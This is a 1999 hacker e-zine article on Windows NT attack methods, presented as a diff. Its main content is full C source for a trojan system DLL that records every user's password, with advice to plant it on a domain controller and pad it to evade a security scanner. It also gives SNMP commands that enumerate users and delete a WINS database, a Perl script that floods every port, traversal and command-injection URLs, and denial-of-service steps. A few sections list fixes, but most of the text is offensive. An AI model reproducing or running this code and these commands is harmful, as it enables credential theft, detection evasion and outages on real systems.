@@ -1,0 +1,569 @@
+   _________  SWAT MAGAZINE ISSUE THIRTEEN: JANUARY 1999 __________
+  /         \___________________________________________/          \
+ /		     =WINDOWS NT ATTACK METHODS=		    \
+/                         By Netw0rk Bug	  	   	     \
+-----------------------------------------------------------------------
+
+
+Exploiting Using DLL Files
+Windows NT And SNMP
+The Get Admin Exploit
+Index Server Exposes Sensitive Material
+SMB Downgrade Attack
+REDBUTTON
+.BAT And .CMD Attacks
+The IIS /..\.. Problem
+Truncated Files
+100% CPU
+The Rollback.exe Tool
+NT PORT PROBLEMS
+ism.html on IIS
+Nwserver Remote Administration sharing bug
+
+
+=========================================================================
+			WINDOWS NT ATTACK METHODS AND EXPLOITS
+=========================================================================
+			EXPLOITING USING DLL FILES
+=========================================================================
+
+Replacing System .dll's
+
+System DLLs are called by applications and the registry, and can be replaced with 
+trojaned/virused versions. %systemroot% and %systemroot%\system32 directories have default 
+permissions of 'Everyone' (includes guest) set to 'Change'. This allows DLLs not in use to be 
+replaced. DLLs in use are locked.
+DLLs are run by programs at various levels during normal operation. A DLL for example can be 
+run with SYSTEM privileges by a service while a user with normal privileges is logged on.
+This is also true for the MSGINA.DLL, which is the default "Graphical Identification and 
+Authorization" provider for the local console logon, which if replaced, could seriously compromise 
+your entire enterprise.
+
+
+
+
+I heard that the %systemroot%\system32 was writeable?
+
+Well, this can be exploited on NT 4.0 by placing a trojaned FPNWCLNT.DLL in that directory. 
+This file typically exists in a Netware environment. First compile this exploit code written by 
+Jeremy Allison (jra@cygnus.com) and call the resulting file FPNWCLNT.DLL. Now wait for the 
+user names and passwords to get written to a file in \temp.
+
+------------- cut --------------
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+struct UNI_STRING {
+  USHORT len;
+  USHORT maxlen;
+  WCHAR *buff;
+  };
+
+static HANDLE fh;
+
+BOOLEAN __stdcall InitializeChangeNotify ()
+{
+  DWORD wrote;
+  fh = CreateFile("C:\\temp\\pwdchange.out", GENERIC_WRITE,
+    FILE_SHARE_READ|FILE_SHARE_WRITE, 0, CREATE_ALWAYS,
+    FILE_ATTRIBUTE_NORMAL|FILE_FLAG_WRITE_THROUGH,
+    0);
+  WriteFile(fh, "InitializeChangeNotify started\n", 31, &wrote, 0);
+  return TRUE;
+}
+
+LONG __stdcall PasswordChangeNotify (struct UNI_STRING *user, ULONG rid,
+  struct UNI_STRING *passwd)
+{
+  DWORD wrote;
+  WCHAR wbuf[200];
+  char buf[512];
+  char buf1[200];
+  DWORD len;
+
+  memcpy(wbuf, user->buff, user->len);
+  len = user->len/sizeof(WCHAR);
+  wbuf[len] = 0;
+  wcstombs(buf1, wbuf, 199);
+  sprintf(buf, "User = %s : ", buf1);
+  WriteFile(fh, buf, strlen(buf), &wrote, 0);
+
+  memcpy(wbuf, passwd->buff, passwd->len);
+  len = passwd->len/sizeof(WCHAR);
+  wbuf[len] = 0;
+  wcstombs(buf1, wbuf, 199);
+  sprintf(buf, "Password = %s : ", buf1);
+  WriteFile(fh, buf, strlen(buf), &wrote, 0);
+
+  sprintf(buf, "RID = %x\n", rid);
+  WriteFile(fh, buf, strlen(buf), &wrote, 0);
+
+  return 0L;
+}
+------------- cut --------------
+
+If you load this on a Primary Domain Controller, you'll get EVERYBODY'S password. You have to 
+reboot the server after placing the trojan in %systenroot%\system32.
+
+ISS (www.iss.net) has a security scanner for NT which will detect the trojan DLL, so you may 
+wish to consider adding in extra junk to the above code to make the size of the compiled DLL 
+match what the original was. This will prevent the current shipping version of ISS's NT scanner 
+from picking up the trojan.
+
+It should be noted that by default the group Everyone has default permissions of "Change" in 
+%systemroot\system32, so any DLL that is not in use by the system could be replaced with a 
+trojan DLL that does something else.
+
+
+
+
+
+=========================================================================
+			WINDOWS NT AND SNMP
+=========================================================================
+
+[13.0.2] WindowsNT and SNMP
+
+Found by Christopher Rouland (from ntsecurity.net)
+
+Christopher writes:
+
+I have found two significant "features" in the SNMP agent implementations under NT 4.0 Server, 
+and I am sure there are more if I feel like really digging. The first issue I sent in earlier this year to 
+Microsoft and received no response other than "expected behavior" and the second I just found 
+and puts any large NT shop at a serious denial of service (DOS) risk.
+
+1. This first exploit demonstrates the ability via SNMP to dump a list of all usernames in an NT 
+domain (assuming the target box is a DC) or on an NT Server.
+Here is the simplest NT example I could find to use this:
+C:\NTRESKIT>snmputil walk public .1.3.6.1.4.1.77.1.2.25
+should be a domain controller or server
+2.The second exploit demonstrates the ability via SNMP to delete all of the records in a WINS 
+database remotely, bypassing all NT security. If you understand large scale WINS 
+architecture, you can understand the implications of this. Knowledge of SNMP community 
+strings would allow an attacker to effectively shut down any large NT infrastructure with "N" 
+commands (N=number of WINS servers). This is permitted due to the extensive "cmd" set 
+implemented in the WINS extension agent, specifically:
+
+2. cmdDeleteWins OBJECT-TYPE
+SYNTAX IpAddress
+ACCESS read-write
+STATUS mandatory
+DESCRIPTION
+"This variable when set will cause all information pertaining to a WINS (data records, context 
+information to be deleted from the local WINS. Use this only when owner-address mapping 
+tables getting to near capacity. NOTE: deletion of all information pertaining to the managed 
+WINS is not permitted"
+::= { cmd 3 }
+Since the SNMP toolset implemented under NT will not do snmp-set-requests, my sample 
+exploit was done using the CMU SNMP development kit under Unix. The command 
+"rnjdev02:~/cmu$ snmpset -v 1 192.178.16.2 public .1.3.6.1.4.1.311.1.2.5.3.0 a 
+192.178.16.2" successfully entirely deleted my WINS database.
+
+3. It appears that there are several other pieces of the LMMIB2 definition that allow for things 
+such as remote session deletion or disconnect, etc, but I have not yet looked into them.
+
+4. Stopping the Problem:
+The simplest fix is to disable SNMP, or to remove the extension agents through the SNMP 
+configuration in the registry.
+If you MUST use SNMP, then at least block inbound access to that port. Be aware that using 
+NT's various SNMP agents, a malicious intruder could gain knowledge about your entire 
+network. In fact, they could quite easily gain everything they need to enter your network, 
+except a password -- and those come in due time. BEWARE.
+
+
+
+
+=========================================================================
+			THE GET ADMIN EXPLOIT
+=========================================================================
+
+The GetAdmin program originated in Russia and has the ability to add users to the Administrators 
+group. No special permissions are needed to execute the program, which interestingly runs 
+through a telnet session as well. Microsoft released a patch that they said stops the attack. If 
+however, you run crash4.exe on the server first and then run GetAdmin, the exploit still works. (All 
+of the executables discussed here are available in the tools section.)
+
+
+
+
+=========================================================================
+			INDEX SERVER EXPOSES SENSITIVE MATERIAL
+=========================================================================
+
+Index Server Exposes Sensitive Material
+Found by Andrew Smith
+
+
+One of the components of Index Server (which is the internal search engine component thats part 
+of Internet Information Server.) can expose material of a highly sensitive nature. This component, 
+webhits.exe allows the web server to read files it would normally not be able to read. If the 
+administrator of the server has left the default sample files on IIS, a hacker could easily have the 
+ability to narrow their searches for usernames and passwords. Once an intruder has located an 
+IIS box that has these default samples still on the server, the intruder can use the sample search 
+page to specify only files that have the word password in them and are script files.
+The URL the hacker would try is http://servername/samples/search/queryhit.htm then the hacker 
+would search with something like "#filename=*.asp"
+When the results are returned not only can one link to the files but also can look at the "hits" by 
+clicking the view hits link that uses the webhits program. This program bypasses the security set 
+by IIS on script files and allows the source to be displayed.
+The default path to webhits.exe is:
+http://servername/scripts/samples/search/webhits.exe
+Stopping the Attack : Remove webhits.exe or move it from its default location.
+
+
+
+
+=========================================================================
+			SMB DOWNGRADE ATTACK
+=========================================================================
+
+SMB Downgrade Attack
+
+May 6, 1997 - 3pm CST [NTSD] - On the heals of April's RedButton exploit comes yet another 
+demonstration of attacking NT networks. A new program has just been released, complete with 
+source code, that will downgrade a Server Message Block (SMB) negotiation - the standard 
+handshake that occurs when a client attempts to connect to an NT Server. Downgrading the 
+authentication causes the client to send its password in clear text, unencrypted - Ouch. This has 
+been a known possibility for quite some time, however no one has released a working program 
+along with source code up until now.
+The program actually runs on a Windows based system loaded with Novell ODI style drivers 
+running in promiscuous mode. Once active, the software listens for SMB negotiations, and upon 
+detecting one, the software sends a single packet to the client instructing it to downgrade its 
+connection attempt to a clear text level - at which point the client silently obeys by sending its 
+password in clear readable text. Once this happens this little piece of software actually grabs the 
+password as it travels over the wire and displays it on the screen. The client is successfully 
+connected to the NT Server, and the user remains none-the-wiser that its password has just been 
+grabbed.
+Under Windows networking, when a client creates a new connection to an NT Server, the clients 
+can be instructed to use a particular authentication mechanism: clear-text or challenge/response. 
+As a result, clients can be instructed to transmit their password in clear text form very easily.
+Furthermore, if an NT Server requested an encrypted login from the client, NT will authenticate 
+the client, even if the client submits the password in clear text after being told to send an 
+encrypted challenge/response answer. To make matters worse, there is no indication that this is 
+taking place, and there is no way to provide an audit trail on the NT Server that indicates the 
+clients are using clear-text passwords - even though the server has requested encrypted 
+authentication. Perhaps NT should in fact be capable of logging an audit trail on this type of 
+activity (hint hint).
+A result of this design characteristic, a rogue client could sit on your network silently listening for 
+username and password pairs traveling across the network during authentication. No physical 
+access or user rights and permissions are required for this attack to work! All that's need is a 
+connection to your network between the clients and servers.
+As I said, this type of SMB downgrade attack has been a known possibility for quite some time - 
+as noted in the Common Internet File System (CIFS) specification (section 8.5.2) - and similar, 
+although not quite the same types of exploits have been demonstrated recently by various college 
+students attempting to show vulnerabilities in Internet Explorer and Windows NT. Previously, NT 
+LAN Manager negotiation and hostile SMB servers were shown to effectively initiate, intercept, or 
+intervene in certain aspects of the client/server authentication process.
+The person bringing this new program to our attention, David Loudon, has suggested that, 
+"Microsoft could initially create a server patch that would not allow the NT Server to accept clear 
+text passwords. While this does not prevent the exposure of the clear-text password, at least the 
+administrator would be alerted that clients were sending clear-text passwords when requested to 
+send encrypted passwords. To completely resolve this issue, all Microsoft networking clients must 
+be replaced with new code that would never send clear text passwords during the authentication 
+process.
+"As long as Microsoft networking is enabled on any DOS, Windows 3.1, Windows for 
+Workgroups, Windows 95, or Windows NT clients, users are susceptible to disclosing their clear 
+text passwords to other devices on the physical network. Resolving this issue requires an 
+administrator to update the Microsoft networking components on all affected desktops as soon as 
+a fix is available from Microsoft."
+Microsoft is definitely aware of this issue, and it appears that this type of functionality was 
+knowingly put in place in order to remain backward compatible with older Microsoft clients like 
+DOS. As a result, don't expect to see a fix for this until Service Pack 3 comes out, and maybe 
+even later.
+The new CIFS Authentication proposal seems to address this issue and a few other potential 
+nasty security problems, but there is no guarantee the new CIFS specs will make it into SP3 yet. 
+The probable outcome is that the new CIFS Authentication specification, which is being hashed 
+out in a public forum on the Internet, will contain newfound configuration switches that can force 
+the client and/or servers to require either clear text or encrypted negotiations.
+
+
+
+
+
+=========================================================================
+			REDBUTTON
+=========================================================================
+
+RedButton
+--From ntsecurity.net
+
+A new program was released this weekend that allows ANYONE with remote access to an NT 
+server (using ports 137, 138, and 139) to connect to that machine, read the registry, and create a 
+new share accessible to the Everyone group. This is a SERIOUS problem that should be guarded 
+against at all costs. A quick test of this new RedButton program shows that it does in fact connect 
+to a remote NT system.
+Administrators should seriously consider blocking access to ports 137, 138, and 139 on any 
+machines exposed to the Internet. You can also stop the Server service to protect yourself, 
+although doing so eliminates the ability for that server to share resources.
+Another consideration is to edit the Registry as follows:
+1. Open HKEY_LOCAL_MACHINE/CurrentControlSet/Control/SecurePipeServers
+2. Create a key called winreg (if it doesn't exist)
+3. Set the security on it however you like, but don't give the Everyone group access - but don't 
+define Everyone with NO ACCESS either as this locks out all accounts.
+4. Reboot the system
+RedButton was released by MWC, security consultants, who are maintaining a Web page about 
+the new RedButton software at http://www.ntsecurity.com/redbutton. NOTE: This Web address is 
+ntsecurity.com - not associated with NTSD or ntsecurity.net. We are not responsible for content at 
+thier site.
+RedButton will:
+* logon remotely to a target computer without presenting a username and password
+* gain access to the resources available to the Everyone group
+* determine the current name of built-in Administrator account
+* read several registry entries and display the information
+* list all shares - even hidden shares
+Microsoft released a HOTFIX for the RedButton problems on May 3, 1997. Be CERTAIN to read 
+the Knowledge Base articles and README files in the distribution directory - this software hotfix 
+installs itself without warning so be careful to understand it completely before proceeding.
+
+
+
+
+
+
+=========================================================================
+			.BAT AND .CMD ATTACKS
+=========================================================================
+
+Sending a command line to the server, such as 
+"http://www.domain.com/scripts/expoit.bat?&commandA+?&commandB" to the server, and then 
+clicking the Stop Button on the browser will cause the server to execute DOS commands on the 
+server's OS.
+Adding a '+?&time' or '+?&date' to the end of the command, will cause the server to pause for 
+input. Clicking the Stop Button on the browser will interrupt the server making a log entry of the 
+command string executed.
+
+
+
+
+
+=========================================================================
+			THE IIS /..\.. PROBLEM
+=========================================================================
+
+A URL such as 'http://www.domain.com/..\..' allows you to browse and download files outside of 
+the webserver content root directory. A URL such as 
+'http://www.domain.com/scripts..\..\scriptname' allows you to execute a target script.
+By default user 'Guest' or 'IUSR_MACHINENAME' has read access to all files on an NT disk. 
+These files can be browsed, executed or downloaded by wandering guests.
+
+
+
+
+=========================================================================
+			TRUNCATED FILES
+=========================================================================
+
+A URL such as http://www.domain.com/scripts/exploit.bat>PATH\target.bat will create a file called 
+"target.bat". If the file "target.bat" already exists, the file will be truncated, erasing any previous 
+contents.
+
+
+
+
+
+=========================================================================
+			100% CPU
+=========================================================================
+
+A problem with RPC services causes NT to consume 100% of the CPU time. All that needs to happen is for a person
+      to simply telnet to port 135 on an NT server, and enter a string of ten characters, followed by a carraige return
+      (pressing enter). After trying this, check the Task Manager to confirm the problem -- you'll see rpcss.exe eating up the
+      CPU.
+
+      Multiple service ports (53, 135, 1031) are vunerable to 'confusion' from this exploit.
+
+      Try the following steps for verification:
+
+             1.Telnet to an NT 4.0 system on port 135 
+             2.Type about 10 characters followed by a <CR> 
+             3.Exit Telnet 
+
+      This results in a target host CPU utilization of 100%, though at a lower priority than the desktop shell. Multiple
+      services which are confused can result in a locked system.
+
+      When launched against port 135, NT Task manager on the target host shows RPCSS.EXE using more than usual
+      process time. To clear this the system must be rebooted.
+
+      The above also works on port 1031 (inetinfo.exe) where IIS services must be restarted.
+
+      If a DNS server is running on the system, this attack against port 53 (dns.exe) will cause DNS to stop functioning.
+
+      The following is modified perl script gleaned from postings in the ntsecurity mailing list at iss.net, to test ports on your
+      system (Perl is available from the NT resource kit):
+
+      /*begin poke code*/
+
+      use Socket;
+      use FileHandle;
+      require "chat2.pl";
+
+      $systemname = $ARGV[0] && shift;
+
+      $verbose = 1; # tell me what you're hitting
+      $knownports = 1; # don't hit known problem ports
+      for ($port = $0; $port<65535; $port++) 
+      {
+
+
+           if ($knownports && ($port == 53 || $port == 135 || $port== 1031)) {
+           next;
+           }
+           $fh = chat::open_port($systemname, $port);
+           chat::print ($fh,"This is about ten characters or more");
+           if ($verbose) {
+           print "Trying port: $port\n";
+           } 
+           chat::close($fh);
+
+      }
+
+      /*end poke code*/
+
+      Save the above text as c:\perl\bin\poke, run like this: C:\perl\bin> perl poke servername
+
+      You cannot kill the rpcss process from the GUI, however you can use the kill.exe program from the NT resource to
+      stop it. You may restart it using the GUI if you like. Any services that were bound to portmapper will have to be
+      restarted as well. Or, you can simply reboot instead.
+
+      Windows NT 3.51 and 4.0 are both vulnerable to this incredibly simple attack. As far as I can tell, this bug was first
+      reported by Jason T. Luttgens (luttgenj@kic.or.jp), and has been reported back to CERT and Microsoft.
+
+      NT Versions Affected:
+
+      3.51, 4.0
+
+
+
+
+=========================================================================
+			THE ROLLBACK.EXE TOOL
+=========================================================================
+
+                                 The information in this article applies to: 
+                               Microsoft Windows NT Workstation version 4.0 
+                                 Microsoft Windows NT Server version 4.0 
+
+        SUMMARY 
+
+        The Windows NT 4.0 Server and Workstation compact discs include a utility called Rollback.exe. Rollback.exe
+        was designed to help computer manufacturers preinstall Windows NT 4.0, and allow end-users to do the final
+        configuration according to the desired role of the computer. Running this utility will remove all registry settings
+        on a system and bring it back to the end of the Character Based Setup portion of the Setup program, effectively
+        undoing everything configured by the GUI portion of Windows NT Setup. 
+
+        WARNING: Do not run this file on a production system! There is no way to recover information erased by
+        running this utility, so anything stored in the registry will be lost. This includes user account information,
+        protocol bindings, application settings, user preferences, etc. 
+
+        MORE INFORMATION 
+
+        If you run Rollback.exe on a production system there is no warning that Rollback.exe removes all system
+        registry entries. Therfore, after you run Rollback.exe there is no system to rescue or to restore as the registry
+        and the Setup.log file no longer exist. 
+
+        The only fix to this problem is to restore the entire system from a current tape back up. Emergency Repair Disk
+        does not restore the system as it requires the Setup.log and specific registry components to be present. 
+
+        Rollback.exe is on the Windows NT compact discs in the following directory: 
+        support\deptools\<system>\
+
+
+
+
+=========================================================================
+			NT PORT PROBLEMS
+=========================================================================
+
+Port 80 
+
+Port 80 has a massive problem in NT 4.0 (see posting below) 
+
+A lot of people are using the Microsoft Internet Information Server for their corporate web sites and intranets. The following
+procedure will halt the web services and effectively "kill" whatever web server they may have. 
+
+1. telnet the server on port 80 (if 80 is the http port) 
+2. GET ../.. 
+
+It definetely works on NT4 + SP1 + IIS2.0. There are conflicting reports of it's effectiveness on 3.51, etc. 
+
+Microsoft has briefly addressed the problem stating that upgrading to IIS3.0 will solve the problem, however, I have also heard
+conflicting reports about that. 
+
+I guess a quick fix would be to move the http server to some other port that would take a long time to guess, or you could set
+up your NT server to reboot every 1.5 minutes. 
+
+FTP and POP on NT servers are not encrypted and with the use of a simple packet sniffer it would be simple to snag legitimate
+logins and passwords by setting the sniffer to the machine and port. 
+
+Port 19 
+CHARGEN, or port 19 which dumps endless ascii crap when connected to is a prime target for a flood, suppose that a IP
+spoof flood comes in (ICMP, UDP whatever) and queries this port a few thousand times... perhaps over a period of hours, the
+server will be shut down.. 
+
+Port 53 
+DNS port 53 is by default an open port on NT, this makes it very easy to play around in this port.. 
+
+Port 161 
+SNMP port 161 could be used to enable the NT performance monitor, by which a large amout of data about the targeted
+server could be obtained very easy. 
+
+Port 513 & 514 
+RSH and RCMD ports 513 and 514 respectively can be used to issue remote commands. 
+
+Port 520 
+RIP port (520) which uses UDP is another which could be used to spoof commands to a server. (send some mail via spoofed
+UDP to a forwarding address or whatever..) 
+
+NT 3.51 the REMOTE.exe and RSHSVC.exe files though RSHSVC is supposed to more secure can be used to issue
+commands over these servers with no restrictions. This could be potentially bad. 
+
+
+
+
+
+
+================================================================
+			ism.html on IIS
+================================================================
+
+
+Other problems related to NT4, there is a default file called ism.html on IIS that can be used for doing remote/local
+administration on a server. The security of this file is horribly poor, each NT machine has a default account called
+"Administrator" and half of the servers out there are using the domain names as the password, or the machine name as the
+password. The FTP accounts on NT servers running virtual servers are very bad also. With "mainhost" being the host machine,
+for a virtual server: 
+
+ftp://ftp.mainhost.com/home/www.virtualhost.com/cgi-bin/filename.cgi 
+
+it will give you access to that file and call it up[ on the screen if you are using a web browser. Now if you then go to the main
+directory e.g 
+
+ftp.*.*/home/www.*.*/cgi-bin 
+
+it then lists the scripts if you're in a web browser u can view all the scripts on screen and check for any bugs, u then pull up the
+web browser and access those scripts using 
+
+http://www.vurualhost.com/cgi-bin/filename.cgi? 
+
+command and you can run the scipt having found the bugs, and this is all from the anonymous ftp login. it works at
+Microsoft.com as long as you know the directory structure you want to go to, even if the directory is hidden in anonymous ftp. 
+This bug is lethal. 
+
+
+
+====================================================================
+		Nwserver Remote Administration sharing bug
+====================================================================
+
+With Remote Administration and File Sharing for Netware Networks enabled on a Windows 95 machine, once a remote
+administrator accesses the system, a shared resource pointing to the hard drive is created to which all users on the same
+network have access. This share remains available even after the administrator logs off the system. 
+
+The shared drive is not visible by browsing through the Explorer, but may be found by mapping a network drive to
+\\computername\C$. This gives read-only access to the entire local hard drive of the sharing computer.
+
+
+
++++EOF+++
